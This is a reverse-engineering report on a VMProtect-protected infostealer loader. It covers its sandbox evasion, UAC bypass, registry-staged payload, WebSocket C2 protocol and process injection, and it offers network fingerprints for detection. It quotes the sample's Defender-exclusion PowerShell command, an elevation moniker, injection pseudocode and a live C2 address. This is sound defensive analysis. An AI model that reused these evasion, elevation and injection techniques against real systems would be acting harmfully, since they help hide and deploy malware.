# RuntimeBroker.exe — a VMProtect loader that stages its payload in the registry

Reverse engineering of the second-stage loader from a commodity infostealer
infection (August 2026). The loader was delivered by a trojanised game trainer,
established a foothold, and pulled a 1.45 MB payload from its C2.

Analysis was done statically and under CPU emulation (Unicorn). The sample was
never executed on a real system.

---

## Sample

| | |
|---|---|
| SHA-256 | `cf0d4b3837b9a23fb46cbb0a90f5ecae6b7dcd5b1f13b9d4a5fe0de7cec85041` |
| Size | 527,872 bytes |
| Type | PE32+ (x64), GUI subsystem |
| Compile timestamp | `0x6A89002F` |
| Entry point | `0x1400170B0` |
| Dropper (stage 1) | `b971a5c1915861d611bf56d718f084406325890e5f47d9a1f64e982481e3b2b8` |

Detection at time of analysis: 28/71 on VirusTotal, all generic names
(`Generic.Dacic`, `Trojan.Evader`, `VHO:HackTool.Win64.Knotweed.gen`). No
family attribution — reasonably, since the credential-theft code is not in
this file.

---

## Summary

This is a **loader**, not a stealer. It builds a foothold, connects to C2, and
waits for instructions. Everything interesting happens when the operator sends
a task.

Three findings are worth the reader's time:

1. **The payload is staged in the registry, not on disk.** Chunks are written
   under `HKCU\Software\WinRAR\Libs` with names like `<id>_<name>_chunk_<n>`,
   using a `tempchunk` → `chunk` atomic-commit scheme that survives reboot and
   supports resume. Filesystem scanning does not see the payload at any point.

2. **The download channel carries a plaintext PE.** The C2 control channel is a
   masked WebSocket, but payload delivery is a separate cleartext HTTP transfer.
   A `MZ` / `PE\0\0` validator runs directly on the received socket buffer, so
   there cannot be an encryption layer on the wire. This makes a trivial,
   decryption-free network signature possible.

3. **The WebSocket handshake key is the example value from RFC 6455.** The
   client is hand-written and sends `Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==`
   on every connection. A conforming client must generate this randomly per
   connection, so it is a near-zero-false-positive fingerprint that survives
   recompilation.

---

## 1. Structure and packing

Seven sections. The sixth has an **empty name** and is executable — the
VMProtect runtime:

```
name       vsize     rawsize   characteristics
.text      0x2B236   0x2B400   0x60000020  RX
.rdata     0x03C8A   0x03E00   0x40000040  R
.data      0x18E50   0x00200   0xC0000040  RW
.pdata     0x018CC   0x01A00   0x40000040  R
.CRT       0x00010   0x00200   0x40000040  R
(unnamed)  0x4E2AC   0x4E400   0x68000020  RX   <- VMProtect runtime
.reloc     0x01578   0x01600   0x42000040  R
```

`.pdata` is fake: **529 `RUNTIME_FUNCTION` entries, zero structurally valid**
(begin/end/unwind fields do not satisfy `0 < begin < end < SizeOfImage`). It is
being abused to store data. Function boundaries therefore cannot be recovered
from the exception directory.

VMProtect is used in **mutation** mode, not virtualisation. `.text` is decoy CRT
code; real logic sits behind heavy constant folding. A representative example —
this is the entire body of a `memcpy`:

```asm
movabs rcx, 0xE5A1D11C0E842139
sub    rdx, rcx
sub    rdx, -1
movabs rcx, 0xE5A1D11C0E842139
add    rdx, rcx              ; rdx = 1
movabs r8,  0x2D7FA90CAC2BB8A2
mov    rcx, rax
add    rcx, r8
sub    rcx, rdx
movabs rdx, 0x2D7FA90CAC2BB8A2
sub    rcx, rdx              ; rcx = n - 1
```

The static import table carries **KERNEL32.dll only** (69 imports). Sixty-four
further APIs are resolved at runtime through `LoadLibraryA` + `GetProcAddress`
into pointer tables in `.data`, including the entire ntdll injection set.

Strings are obfuscated per-string: **204 decryption call sites backed by 63
distinct routines**, one dedicated thunk per string. Some routines decrypt in
place in `.rdata`; others write their plaintext into a **TLS slot**
(`gs:[0x58]` → TLS array → block + fixed offset). 159 plaintext strings were
recovered by calling each thunk in an isolated single-function sandbox.

---

## 2. Anti-analysis

Ten-plus layers, all checked before the main loop runs:

| Check | Mechanism |
|---|---|
| VM drivers | `CreateFileA` on VBox / VMware / QEMU / Parallels / Xen driver names |
| VM devices | `\\.\VBoxMiniRdrDN`, `\\.\HGFS`, `\\.\prl_usb_mouse` |
| CPUID | hypervisor bit + brand strings `KVMKVMKVM`, `VMwareVMware`, `XenVMMXenVMM`, `prl hyperv`, `VBoxVBoxVBox`, `QEMU`, `Microsoft Hv` |
| GPU | D3D9 adapter identifier vs a blacklist that explicitly names **`anyrun GPU`** |
| Display | `EnumDisplaySettingsW` resolution sanity |
| CPU model | rejects `Broadwell`, `EPYC`, `G6900` — common cloud-sandbox models |
| Debugger | `NtQueryInformationProcess` plus a timing watchdog thread |
| Self-protection | `RtlSetProcessIsCritical` — force-terminating the process bugchecks the host |

The `anyrun GPU` and cloud-CPU-model entries are notable: the author is
specifically evading public online sandboxes rather than local VMs alone.

---

## 3. Execution chain

Note that elevation, AV blinding, installation and persistence are all
**this sample's own code**, not the dropper's. The dropper only delivers it.

```
HowToFishTrainer.exe   stage 1, trojanised game trainer (.NET Native AOT)
  └─ delivers and runs RuntimeBroker.exe

RuntimeBroker.exe      stage 2 -- this sample; everything below is its own code
  |
  ├─ recon     geofence via Control Panel\International\Geo\Nation,
  │            CPU vendor, BIOS manufacturer, volume serial, display
  │            parameters, plus the VM checks in §2
  │
  ├─ elevate   CheckTokenMembership -> not an administrator
  │            CoGetObject("Elevation:Administrator!new:{3E5FC7F9-...}")
  │            -> ICMLuaUtil::ShellExec(own path)            no UAC prompt
  │
  ├─ blind     powershell -Command "Add-MpPreference -ExclusionPath
  │              'C:\ProgramData\Windows\Microsoft',
  │              'C:\ProgramData\Microsoft\Windows'" && gpupdate /force
  │            amsi.dll!AmsiOpenSession patched in memory     (0x140011B70)
  │
  ├─ install   GetModuleFileNameW + CompareStringOrdinal to test whether it is
  │            already in place; DeleteFileW / SetFileAttributesW to clear an
  │            older build; CopyFileW to
  │            C:\ProgramData\Windows\Microsoft\RuntimeBroker.exe;
  │            CreateProcessW the copy, original ExitProcess
  │
  ├─ persist   CoCreateInstance(ITaskService) x4, four scheduled tasks    §8
  │
  └─ beacon    WSAStartup -> getaddrinfo -> socket -> connect
               WebSocket handshake -> "ready;..." -> wait for commands    §4
```

The second exclusion path, `C:\ProgramData\Microsoft\Windows`, is a **real
Windows directory**. It is chosen so the exclusion list looks plausible under
manual review. Detection must therefore test for the *presence of the exclusion
entry*, not for the existence of the directory.

---

## 4. C2 protocol

A hand-written WebSocket client over raw sockets. Hard-coded C2
`45.91.202.146`, ports `406` and `408`, both stored encrypted in the config
block and decrypted into TLS at runtime.

The handshake sends the RFC 6455 **example** key verbatim:

```
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

Framing is RFC-conformant: client frames are masked with a 4-byte key
transmitted in the clear at offset 2-5; server frames are unmasked. (An early
emulation attempt masked the server frames, violating the RFC, and the sample
retried 1,363 times before giving up — a useful accidental confirmation that it
validates framing.)

Registration message, sent once:

```
ready;00000000;version;1.0.0
```

Campaign ID `63203572`. Commands observed from the server:

| Command | Handler | Action |
|---|---|---|
| `ping` | — | replies `pong` |
| `getinfo` | `0x1400084C0` | WMI `ROOT\SecurityCenter2`, `SELECT displayName FROM AntiVirusProduct` → AV product list, OS version, username, SID |
| `task` | `0x14000FA50` | see §5 |
| `checkserver` | `0x140015870` | C2 liveness probe, see §4.1 |

### 4.1 C2 liveness and fallback

`0x140015870(host, port, callback, 0)` contains **two independent retry loops**,
each capped at 5 attempts with `Sleep(30000)` between failures:

| | Primary | Fallback |
|---|---|---|
| Host source | hard-coded config IP `L"45.91.202.146"` (passed in `rcx`) | `RegRead(Software\Microsoft\EventSystem, "System")` + `".duckdns.org"` |
| Probe | `0x1400159E6` → `0x1400160E0` | `0x140015B7B` → `0x1400160E0` |
| On success | `RegWrite` cache at `0x140015A17` | `RegWrite` cache at `0x140015BAC` |

`0x1400160E0` is a standard non-blocking reachability test: `getaddrinfo` →
`socket` → `connect` → `select` → `getsockopt(SO_ERROR)` → `closesocket`, with a
3-second timeout.

The `.duckdns.org` **subdomain prefix is not in the binary**. It is whatever
hostname most recently probed successfully, cached in the registry. The infected
host was wiped, so that cached value is gone — this is data loss, not an
analysis gap.

A 62-character alphabet (`a-zA-Z0-9`) coexists with the domain suffix in the
config, which initially suggested a DGA. It is not: the PRNG at `0x140014FB0`
(`GetTickCount64`-seeded, `div rcx` mod 62) produces the nonce in
`checkserver;<value>;<nonce>`.

---

## 5. Task subsystem

```
task;<verb>;task_id;<id>;type;<type>;version;<ver>;param;<param>
```

The dispatcher skips `"task;"`, extracts the verb, then `strstr("task_id;") + 8`
for the ID. It allocates a **0x188-byte (392) task structure** on the heap and
spawns a dedicated worker thread per task (`0x14000F7A0`), so the receive loop
never blocks.

| Verb | Behaviour |
|---|---|
| `createtask` | reassemble payload from chunks → suspended-process injection (§6) |
| `update` | report `task_done;` → prepare elevation → `ExitProcess`; scheduled tasks restart the new build |
| `closetask` | `OpenProcess` + `TerminateProcess` + `WaitForSingleObject` on the recorded PID |

`closetask` operating on a recorded PID is what first indicated that
`createtask` spawns a real, separate process rather than running in-process.

---

## 6. Payload delivery — registry chunking

`0x14000B770` is a download channel **independent of the WebSocket control
channel**. It never executed under emulation (it requires a real `createtask`),
so this is static reconstruction supported by the recovered dynamic API table.

```c
buf = HeapAlloc(heap, HEAP_ZERO_MEMORY, 0x300000);   // 3 MB — fits the 1.45 MB payload
WSAStartup(0x202, &wsa);
WideCharToMultiByte(host);
getaddrinfo(); socket(); connect();
sprintf(request);                                     // includes a "Host: " header
send(); recv() until complete;
shutdown(); closesocket(); WSACleanup();

IsValidPE(buf, size);                                 // 0x140005FB0 — see §7

RegCreateKeyA(HKCU, "Software\\WinRAR\\Libs");
  sprintf("%s_%s_tempchunk_%d"); RegSetValueExA(...);  // staged write
  sprintf("%s_%s_tempchunk_%d"); RegDeleteValueA(...); // clear stale staging
RegCloseKey();
  RegGetValueA(tempchunk) → HeapAlloc → RegSetValueExA(chunk) → RegDeleteValueA(temp);
                                                      // atomic commit
```

The two-name scheme is a **resume protocol**: committed `chunk` values survive
process termination and reboot, so a killed transfer continues from where it
stopped. `Software\WinRAR\Libs` is chosen for camouflage — it looks like WinRAR
library data.

### Injection

```c
CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, ...,
               CREATE_SUSPENDED | CREATE_NO_WINDOW, ...);   // 0x08000004
ResumeThread(pi.hThread);
Sleep(500);                                   // let cmd.exe initialise

// reflective loader, 0x14000AA10
NtAllocateVirtualMemory(hProcess, ...);
NtWriteVirtualMemory(hProcess, image + loader stub);
NtCreateThreadEx(hProcess, stub);
// the stub receives the addresses of LoadLibraryA / GetProcAddress and resolves
// the image's imports itself; RtlAddFunctionTable registers SEH unwind data for
// the manually mapped image

if (failed) TerminateProcess(hProcess, 1);
*outPid = pi.dwProcessId;                     // recorded for closetask
```

It uses `Nt*` rather than `VirtualAllocEx` / `WriteProcessMemory` /
`CreateRemoteThread`, bypassing the kernel32 functions that user-mode hooks
most commonly cover.

Net effect: **the only executable ever written to disk is the loader itself.**
The stealer exists only as registry binary values and as memory inside a
windowless `cmd.exe`.

---

## 7. What comes down the wire

A raw, unencrypted PE — specifically a **DLL**. Two independent lines of
evidence.

**The validator.** `0x140005FB0` runs on the freshly received buffer, before
any other processing:

```c
BOOL IsValidPE(void *buf, DWORD size)
{
    if (!buf || size < 0x40)                         return FALSE;
    if (*(WORD*)buf != 0x5A4D)                       return FALSE;  // 'MZ'
    if (dos->e_lfanew <= 0)                          return FALSE;
    if (buf + e_lfanew > buf + size)                 return FALSE;
    nt = buf + dos->e_lfanew;
    if (*(DWORD*)nt != 0x00004550)                   return FALSE;  // 'PE\0\0'
    if (nt + 0x108 > buf + size)                     return FALSE;
    if (!(nt->FileHeader.Characteristics & 0x2000))  return FALSE;  // IMAGE_FILE_DLL
    if (nt->OptionalHeader.SizeOfImage > size * 2)   return FALSE;
    return TRUE;
}
```

Those magic values cannot match if an encryption or compression layer is
present, and passing the check is a precondition for storing the payload. The
`0x2000` test additionally proves the second stage is a DLL.

**The receive path.** `0x140010FB0`, the helper called inside the `recv` loop,
is a plain byte-wise copy. Over its true extent
(`0x140010FB0`–`0x14001105E`, 175 bytes, 39 instructions): **zero real `xor`,
zero `rol`/`ror`/`shl`/`shr`/`not`/`neg`**, one `xor ecx, ecx` zeroing idiom,
and exactly two byte-level memory accesses.

---

## 8. Persistence

Four scheduled tasks, named to blend into stock Windows task folders:

```
Updates compatibility database
Handles restoring settings from the cloud
SvcRestartTaskWindowsLogins
ProgramDataUpdate / ScheduledDef / MicrosoftUpdaterMachineCore
BootTrigger, TimeRepetition, PT0S      (ISO 8601 zero interval = continuous)
```

Created through COM `ITaskService` (`0x140013340`, `0x140011E80`).

---

## 9. Capability set

64 APIs resolved dynamically into `.data` pointer tables. Two independent
methods agree on the count: runtime slot reverse-lookup under emulation
resolved 64, and static recovery of the resolver name thunks yields the same 64.

```
ntdll      NtAllocateVirtualMemory, NtWriteVirtualMemory, NtFreeVirtualMemory,
           NtCreateThreadEx, NtQueryInformationProcess, RtlSetProcessIsCritical,
           RtlGetVersion, RtlInitUnicodeString, Rtl{Enter,Leave}CriticalSection
advapi32   Reg{Create,Open,Set,Query,Get,Enum,Delete,Close}* (A and W),
           OpenProcessToken, AdjustTokenPrivileges, GetTokenInformation,
           AllocateAndInitializeSid, CheckTokenMembership, ConvertSidToStringSidW,
           LookupPrivilegeValueW, GetUserNameW, FreeSid
ws2_32     send, recv, socket, connect, shutdown, closesocket, select,
           WSAStartup, WSACleanup, WSAGetLastError, getaddrinfo, freeaddrinfo,
           getsockopt, setsockopt, ioctlsocket
ole32      CoInitializeEx, CoCreateInstance, CoUninitialize, CoGetObject
oleaut32   SysAllocString, SysAllocStringLen, SysFreeString, VariantInit, VariantClear
user32     RegisterClassW, CreateWindowExW, GetMessageW, TranslateMessage,
           DispatchMessageW, DefWindowProcW, PostQuitMessage, WaitForInputIdle
```

`LoadLibraryA` / `GetProcAddress` are not in the table — they belong to the
resolver. `RtlAddFunctionTable` is not either: it is passed to the injected stub.

Token theft targets `winlogon`, `smartscreen`, `explorer.exe` with
`SeDebugPrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeIncreaseQuotaPrivilege`.

---

## 10. Coverage and limits

Function inventory was built by recursive descent over direct `call` targets,
because `.pdata` is unusable. That yields **335 targets in `.text`**, classified:

| Class | Functions | Bytes | Share of `.text` | State |
|---|---|---|---|---|
| A — control flow read line by line | 16 | 19,936 | 11.3% | done |
| B — per-string decryption thunks | 55 | 77,568 | 43.9% | functionally solved (159 plaintexts recovered) |
| C — external API behaviour | 50 | 42,080 | 23.8% | all characterised |
| D — pure computation / CRT | 214 | 36,838 | 20.8% | no external behaviour |

Dynamic coverage under emulation: `.text` 50.37%, unnamed section 19.44%
(34,285 unique instruction addresses). Everything beyond that is static
reconstruction, and the two are labelled separately throughout.

**335 is a lower bound, not a count of functions.** VMProtect rewrites some call
sites into jump chains inside its own section, leaving the callee with no
static reference at all. Three functions discussed above are in exactly that
position:

| Function | How it was found |
|---|---|
| `0x14000F7A0` (task worker) | `0x1400100DB lea r8,[rip-0x942]` + `CreateThread` |
| `0x140015870` (checkserver) | dynamic coverage, then an entry hook reading the stack |
| `0x1400084A0` (checkserver callback) | only visible as a runtime `r8` argument |

A byte-level scan for any rip-relative or absolute reference to `0x140015870`
across the whole file returns nothing, while the same scan correctly finds
`0x14000F7A0`. Under emulation the function nevertheless executes; hooking its
entry gives a return address of `0x140099924` — inside the unnamed section.
The original call site has been dissolved by the mutation engine.

So "66 behavioural functions fully characterised" should be read as *all
identified behavioural functions*, not as a claim that no others exist. A crude
attempt to find missed functions (covered addresses more than 0x1000 from any
known entry) leaves 538 addresses unattributed, which is inconclusive because
the heuristic cannot establish function extents.

**Not obtained:**

- **The second-stage payload itself.** It is not in this file; the C2 delivers it
  on demand in response to a `createtask` command. The infected host was wiped,
  taking the staged registry chunks with it, and no public sandbox run appears to
  have captured it either — across the 20 samples VirusTotal associates with this
  C2, every dropped file is the loader's own self-copy.

  **Whether the C2 is still reachable was not tested.** "Not obtained" here means
  exactly that; it is not a claim that retrieval is impossible. Note also that
  absence of network activity in public sandbox reports is *expected* regardless
  of C2 state: the anti-analysis checks in §2 run long before the beacon in §3,
  so a sample that detects the sandbox never reaches the network stage. Sandbox
  telemetry therefore says nothing about whether the server is alive.
- **The `.duckdns.org` subdomain prefix.** Mechanism understood (§4.1); the
  cached value is gone with the host.
- **The unnamed 320 KB section.** VMProtect's own runtime. Analysing it studies
  VMProtect, not this loader.

---

## Appendix — reproduction

```
Unicorn Engine 2.1.4 + pefile 2024.8.26 + capstone 5.0.7, Python 3.11
```

The harness maps the PE image, constructs a synthetic TEB/PEB/TLS, fakes the
IAT with API stubs, and returns plausible values for each anti-analysis probe.
A fake socket layer captures C2 traffic. Strings are recovered by invoking each
decryption thunk in an isolated Unicorn instance rather than running the sample
body.

The sample is never executed natively. Unicorn is a CPU emulator with no OS
underneath: `syscall` has nowhere to dispatch, and every API lands on a stub
address. Scripts import only `pefile`, `struct`, `unicorn`, `capstone`, `json`,
`os`, `re`, `collections` — no `socket`, `subprocess`, `ctypes`, or `winreg`.

The one honest residual risk: Unicorn is C code parsing an attacker-controlled
instruction stream. A memory-safety bug in Unicorn is theoretically exploitable.
The probability is low — this sample targets Windows, not Unicorn — but it is
not zero, and it is the only real exposure in this workflow.

See [`tools/`](tools/) for the scripts and [`detection/`](detection/) for rules.